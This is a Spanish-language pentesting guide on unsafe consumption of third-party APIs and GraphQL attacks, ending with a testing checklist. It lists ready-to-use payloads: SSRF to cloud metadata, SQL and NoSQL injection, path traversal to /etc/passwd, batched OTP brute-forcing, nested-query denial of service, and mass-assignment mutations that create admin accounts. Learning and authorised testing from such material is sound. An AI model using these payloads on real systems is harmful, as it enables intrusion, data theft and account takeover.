# API10 & GraphQL Attacks

### API10 — Unsafe Consumption of APIs

Cuando una API consume otras APIs de terceros (integraciones, microservicios, proveedores externos), a menudo confía ciegamente en los datos recibidos sin validarlos. Si un tercero está comprometido o si el atacante puede influir en la respuesta del tercero, puede inyectar datos maliciosos que la API procesa sin sanitizar.

```
Flujo normal:
Atacante → App → API de tercero (confiable) → App procesa respuesta

Flujo vulnerable:
Atacante → App → API de tercero (comprometida / MITM) → datos maliciosos
→ App procesa sin validar → SQLi, SSRF, Path Traversal, XSS en la respuesta
```

#### Vectores de ataque

**SSRF via respuesta de tercero**

```bash
# Si la app hace: GET /api/products?external_url=https://proveedor.com/catalog
# Y usa la URL devuelta por el proveedor para hacer otra petición interna

# Si el atacante controla el endpoint del proveedor o hay MITM:
# Proveedor devuelve: {"image_url": "http://169.254.169.254/latest/meta-data/"}
# → La app hace fetch a la metadata de AWS

# Probar: ¿La app sigue URLs recibidas en respuestas de terceros?
# Inyectar URLs internas en webhooks de retorno
POST /api/payments/webhook
{"status": "completed", "redirect": "http://127.0.0.1:8080/admin"}
```

**Inyección via datos de tercero**

```bash
# Si la app inserta en la DB datos recibidos de una API de tercero sin sanitizar:
# Tercero devuelve: {"name": "'; DROP TABLE users; --"}
# → SQLi en el nombre del producto

# Probar campos que la app recibe de APIs externas y luego muestra:
# Nombre de empresa desde API de pagos (Stripe, PayPal...)
# Dirección desde API de geolocalización
# Nombre de archivo desde API de storage
# Descripción desde API de tercero
```

**Dependency Confusion en APIs de microservicios**

```bash
# Si los microservicios internos se llaman por nombre:
# http://user-service/api/users
# http://payment-service/api/payments

# Si un atacante puede registrar un paquete npm/pip con ese nombre
# o si hay un subdominio takeover en el nombre del servicio interno
# → Los paquetes internos se reemplazan por los del atacante
```

#### Detectar unsafe API consumption

```bash
# 1. Identificar qué APIs de terceros consume la app
# → Buscar en JS: stripe.com, paypal.com, twilio.com, sendgrid.com...
# → Revisar headers de respuesta: X-Powered-By, Server, terceros

# 2. Verificar si la app valida los datos recibidos
# → Manipular un webhook de respuesta del tercero
# → Si la app lo procesa sin validar → vulnerable

# 3. Probar payloads en campos que viene de terceros
# Nombre de webhook: <script>alert(1)</script>
# URL de callback: http://127.0.0.1/admin
# ID de tercero: ' OR 1=1 --
```

### GraphQL — Ataques Específicos

GraphQL es un lenguaje de consulta para APIs que permite al cliente especificar exactamente qué datos necesita. Reemplaza REST en muchas aplicaciones modernas (Facebook, GitHub, Shopify...).

```graphql
# En REST necesitarías múltiples peticiones:
GET /api/users/1042
GET /api/users/1042/orders
GET /api/users/1042/addresses

# En GraphQL, una sola petición:
query {
    user(id: 1042) {
        name
        email
        orders {
            id
            total
            items {
                product_name
                price
            }
        }
        addresses {
            street
            city
        }
    }
}
```

#### Reconocimiento GraphQL

```bash
# Endpoints comunes de GraphQL
/graphql
/api/graphql
/gql
/query
/v1/graphql
/graph
/graphiql      ← IDE interactivo (si está en producción = hallazgo)
/playground    ← Playground de GraphQL (si está en producción = hallazgo)

# Verificar si hay GraphiQL o Playground (IDE visual expuesto)
curl https://target.com/graphql -I
# Buscar en la respuesta: "graphiql", "playground"
# Si hay interfaz visual en producción → el atacante puede explorar el schema
```

#### Introspección — Enumerar el schema completo

La introspección de GraphQL permite consultar el schema completo: todos los tipos, queries, mutations, campos y sus argumentos.

```graphql
# Query de introspección básica
{
    __schema {
        types {
            name
            kind
            fields {
                name
                type {
                    name
                    kind
                }
            }
        }
    }
}

# Query de introspección completa (más usada)
{
    __schema {
        queryType { name }
        mutationType { name }
        types {
            name
            kind
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    name
                    type { name kind }
                    defaultValue
                }
                type { name kind }
                isDeprecated
                deprecationReason
            }
        }
    }
}
```

```bash
# Con graphql-introspection-tooling
# InQL (Burp extension) → genera automáticamente todas las queries posibles

# Con clairvoyance (si la introspección está deshabilitada)
# Hace fuzzing de nombres de campos basado en wordlists
python3 clairvoyance.py -o schema.json https://target.com/graphql

# Visualizar el schema obtenido
# GraphQL Voyager: https://graphql-kit.com/graphql-voyager/
# → Importar el schema → visualización interactiva del grafo
```

#### BOLA en GraphQL

```graphql
# GraphQL es vulnerable a BOLA igual que REST
# El cliente especifica el ID → el servidor debe verificar autorización

# BOLA básico: acceder a datos de otro usuario
query {
    user(id: 1043) {        # ← ID de otro usuario
        email
        phone
        creditCards {
            number
            cvv
        }
    }
}

# BOLA via relaciones anidadas
query {
    order(id: 9988) {       # ← pedido de otro usuario
        total
        address {
            street
            user {
                password_hash
                api_key
            }
        }
    }
}
```

#### Batching attacks

GraphQL permite enviar múltiples queries en un solo request (batching). Esto puede usarse para bypassear rate limiting.

```graphql
# Batch de múltiples queries en una petición
[
    {"query": "query { user(id: 1001) { email } }"},
    {"query": "query { user(id: 1002) { email } }"},
    {"query": "query { user(id: 1003) { email } }"},
    ...
    {"query": "query { user(id: 1100) { email } }"}
]
# Una sola petición HTTP → 100 queries → bypass de rate limiting por petición

# Batch de mutations para bruteforce de OTP
[
    {"query": "mutation { verifyOTP(code: \"000000\") { token } }"},
    {"query": "mutation { verifyOTP(code: \"000001\") { token } }"},
    {"query": "mutation { verifyOTP(code: \"000002\") { token } }"},
    ...
]
# Probar todos los OTPs en una sola petición HTTP
```

#### Nested queries DoS (N+1 problem)

GraphQL permite queries profundamente anidadas que pueden generar miles de queries a la base de datos.

```graphql
# Query maliciosa con anidamiento profundo
query {
    users {           # SELECT * FROM users (100 usuarios)
        orders {      # SELECT * FROM orders WHERE user_id=X (×100 = 10.000 queries)
            items {   # SELECT * FROM items WHERE order_id=X (×10.000 = 1M queries)
                product {
                    category {
                        products {  # ← recursi ón infinita si no hay límite
                            ...
                        }
                    }
                }
            }
        }
    }
}
# Una sola petición HTTP → millones de queries a la DB → DoS

# También via aliases para duplicar el trabajo
query {
    alias1: users { email }
    alias2: users { email }
    alias3: users { email }
    # ... repetir 1000 veces
}
```

#### Inyecciones en GraphQL

```graphql
# SQLi en argumentos de GraphQL (si no hay ORM o está mal usado)
{
    user(id: "1 OR 1=1 --") {
        email
    }
}

# NoSQL injection en MongoDB con GraphQL
{
    user(filter: "{\"$where\": \"sleep(5000)\"}") {
        email
    }
}

# SSRF via campo URL
mutation {
    uploadImage(url: "http://169.254.169.254/latest/meta-data/") {
        imageId
    }
}

# Path traversal en operaciones de archivo
mutation {
    readFile(path: "../../../../etc/passwd") {
        content
    }
}
```

#### Mutations peligrosas

```graphql
# Buscar mutations que creen/modifiquen objetos privilegiados
mutation {
    createUser(input: {
        email: "backdoor@evil.com"
        password: "hacked123"
        role: "admin"           # ← mass assignment en GraphQL
        isAdmin: true
    }) {
        id
        role
    }
}

# Cambiar contraseña sin conocer la actual
mutation {
    updateUser(id: 1043, input: {
        password: "hacked123"   # ← sin verificar contraseña actual
    }) {
        id
    }
}
```

#### Herramientas para GraphQL

```bash
# InQL — Burp Suite Extension
# BApp Store → InQL → genera queries a partir del schema
# Permite hacer BOLA testing automáticamente

# Altair GraphQL Client — cliente gráfico
# Más potente que GraphiQL para testing

# graphql-cop — auditoría de seguridad automática
pip3 install graphql-cop
graphql-cop -t https://target.com/graphql

# Checks que realiza:
# → Introspection habilitada
# → Batching habilitado
# → Field suggestions (filtración de nombres de campos)
# → Depth limit (DoS por anidamiento)
# → Aliases (bypass de rate limit)
# → GET queries habilitadas

# clairvoyance — reconstruir schema sin introspección
python3 clairvoyance.py https://target.com/graphql -o schema.json

# graphw00f — fingerprint del servidor GraphQL
python3 main.py -f -t https://target.com/graphql
# Identifica: Apollo, Hasura, AWS AppSync, Sangria...
```

### Checklist API10 & GraphQL

```
API10 — Unsafe Consumption:
□ Identificar todas las APIs de terceros que consume la app
□ Verificar si los datos de terceros se insertan en la DB sin sanitizar
□ Probar inyecciones en campos que provienen de integraciones externas
□ Probar SSRF en URLs recibidas en webhooks y callbacks

GraphQL:
□ Verificar si la introspección está habilitada → enumerar schema
□ Verificar si GraphiQL/Playground está expuesto en producción
□ Probar BOLA: acceder a objetos de otros usuarios via queries
□ Probar batching: enviar 100 queries en un array → ¿bypass de rate limit?
□ Probar nested queries profundas → ¿causa lentitud/DoS?
□ Probar mass assignment en mutations: añadir campos role, isAdmin
□ Buscar mutations sin autorización (crear users, cambiar contraseñas)
□ Ejecutar graphql-cop para auditoría automática
□ Probar inyecciones (SQLi, NoSQL, SSRF) en argumentos de queries
```

> graphql-cop es el equivalente a nikto para GraphQL: una sola ejecución detecta 10+ misconfiguraciones comunes (introspección, batching, depth limit, aliases...) en segundos.

> El batching attack para bruteforce de OTP es especialmente efectivo en GraphQL porque el rate limiting suele estar aplicado por petición HTTP, no por número de operaciones dentro del batch. 1 petición HTTP puede contener 1.000 intentos de OTP.

> Si la introspección de GraphQL está deshabilitada, no significa que la API sea segura — las vulnerabilidades de BOLA, inyecciones y misconfiguraciones siguen existiendo. Usar clairvoyance para reconstruir el schema por fuerza bruta antes de descartarlo.
